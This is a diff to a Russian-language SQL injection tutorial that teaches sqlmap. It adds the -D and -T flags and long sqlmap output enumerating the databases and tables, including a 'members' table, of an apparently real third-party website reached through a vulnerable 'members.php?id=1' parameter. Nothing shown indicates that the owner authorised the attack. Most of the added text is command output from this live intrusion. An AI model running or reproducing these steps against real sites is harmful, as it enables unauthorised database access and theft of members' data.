@@ -11,6 +11,8 @@
 
 P.S Спасибо за понимание :>
 
+# PART1 >> Основа работы GET запроса
+
 ## Что такое SQLInject?
 SQLInject - это способ взлома сайта,работающий с базами данных,основанный на внедрении в запрос произвольного SQL-кода,атаки такого типа могут дать злоумышленнику
 доступ к базе данных.
@@ -78,6 +80,8 @@ http://www.asfaa.org/members.php?id=1
 -u URL,                 Целевой хост
 -A --random-agent,      Использование значение заголовка User-Agent 
 --tables,               Построить список таблиц
+-D  DB                  База данных для перечисления
+-T  TBL                 Таблицы базы данных для перечисления
 ```
 
 
@@ -143,4 +147,140 @@ sqlmap -u http://www.asfaa.org/members.php?id=1 --tables
 
 ```sh
 [INFO] fetching tables for databases: 'db83231_acolop, db83231_asfaa, information_schema'
+```
+
+Таблица содержимого:
+
+```sh
+Database: information_schema                                                                                                                                                                                     
+[72 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_TEMPORARY_TABLES               |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CHANGED_PAGES                  |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| TEMPORARY_TABLES                      |
+| THREAD_STATISTICS                     |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| XTRADB_INTERNAL_HASH_TABLES           |
+| XTRADB_READ_VIEW                      |
+| XTRADB_RSEG                           |
+| XTRADB_ZIP_DICT                       |
+| XTRADB_ZIP_DICT_COLS                  |
++---------------------------------------+
+
+Database: db83231_acolop
+[14 tables]
++---------------------------------------+
+| events                                |
+| exd_image_list                        |
+| fotos                                 |
+| galeria                               |
+| image_list                            |
+| image_listcaps                        |
+| links                                 |
+| membros                               |
+| news                                  |
+| news_cat                              |
+| news_img                              |
+| newsletter                            |
+| postal                                |
+| videos                                |
++---------------------------------------+
+
+Database: db83231_asfaa
+[11 tables]
++---------------------------------------+
+| atelier                               |
+| categorias                            |
+| content                               |
+| content_files                         |
+| content_fotos                         |
+| content_links                         |
+| content_types                         |
+| members                               |
+| news                                  |
+| news_backup                           |
+| tipos                                 |
++---------------------------------------+
+```
+
+3. Например я хочу узнать db83231_asfaa.Для этого мы будем использовать флаг --tables,тем более нам нужно указать базу через флаг -D(Хотя это мы узнавали в прошлой команде)
+
+```sh
+Database: db83231_asfaa                                                                                                                                                                                          
+[11 tables]
++---------------+
+| atelier       |
+| categorias    |
+| content       |
+| content_files |
+| content_fotos |
+| content_links |
+| content_types |
+| members       |
+| news          |
+| news_backup   |
+| tipos         |
++---------------+
 ```
